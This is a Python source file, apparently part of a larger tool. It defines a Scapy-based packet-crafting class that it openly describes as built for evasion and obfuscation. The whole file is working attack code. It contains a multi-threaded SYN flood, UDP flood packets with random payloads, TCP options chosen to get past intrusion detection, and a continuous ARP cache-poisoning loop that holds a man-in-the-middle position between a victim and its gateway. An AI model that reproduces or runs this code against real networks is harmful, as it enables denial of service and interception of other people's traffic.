from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
import threading
import time
from utils.logger import logger
from config.settings import config

class AdvancedPacketCrafter:
    """Enterprise packet crafting with evasion & obfuscation"""
    
    def __init__(self):
        self.interface = config.get('network.interface', 'en0')
        self.src_mac = config.get('network.src_mac')
        self.src_ip = get_if_addr(self.interface)
        logger.info(f"Initialized on {self.interface} | IP: {self.src_ip} | MAC: {self.src_mac}")

    def create_syn_packet(self, target_ip, port, options=True, mss=1460):
        """SYN with custom TCP options to bypass IDS"""
        ip = IP(src=self.src_ip, dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=port, flags="S", seq=RandInt())
        if options:
            # Add MSS, window scale, SACK permitted, timestamp
            tcp_options = [("MSS", mss), ("WScale", 7), ("SAckOK", b''), ("Timestamp", (int(time.time()), 0))]
            tcp.options = tcp_options
        return ip/tcp

    def create_udp_flood_packet(self, target_ip, port, payload_size=1024):
        """UDP packet with random payload (evasion)"""
        ip = IP(src=self.src_ip, dst=target_ip)
        udp = UDP(sport=RandShort(), dport=port)
        payload = Raw(RandString(size=payload_size))
        return ip/udp/payload

    def create_arp_spoof_packet(self, target_ip, spoof_mac, victim_ip):
        """ARP reply for cache poisoning"""
        arp = ARP(
            op=2,  # is-at
            hwsrc=spoof_mac,
            psrc=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            pdst=victim_ip
        )
        return Ether(src=spoof_mac)/arp

    def send_packet(self, packet, count=1, interval=0):
        """Threaded packet sender with interval jitter"""
        for _ in range(count):
            send(packet, iface=self.interface, verbose=False)
            if interval > 0:
                time.sleep(interval + random.uniform(-0.01, 0.01))  # Jitter

    def syn_flood(self, target_ip, port, threads=10, count=1000):
        """Multi-threaded SYN flood with random delays"""
        logger.info(f"Starting SYN flood on {target_ip}:{port} with {threads} threads")
        def worker():
            for _ in range(count // threads):
                pkt = self.create_syn_packet(target_ip, port, options=random.choice([True, False]))
                self.send_packet(pkt)
        workers = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.start()
            workers.append(t)
        for t in workers:
            t.join()
        logger.info(f"SYN flood completed: {count} packets sent")

    def arp_spoof_loop(self, target_ip, gateway_ip, interval=2):
        """Continuously send spoofed ARP replies to maintain MITM"""
        logger.info(f"ARP spoofing {target_ip} <-> {gateway_ip} every {interval}s")
        my_mac = Ether().src if self.src_mac is None else self.src_mac
        while True:
            # Tell target that we are the gateway
            pkt1 = self.create_arp_spoof_packet(gateway_ip, my_mac, target_ip)
            # Tell gateway that we are the target
            pkt2 = self.create_arp_spoof_packet(target_ip, my_mac, gateway_ip)
            send(pkt1, iface=self.interface, verbose=False)
            send(pkt2, iface=self.interface, verbose=False)
            time.sleep(interval)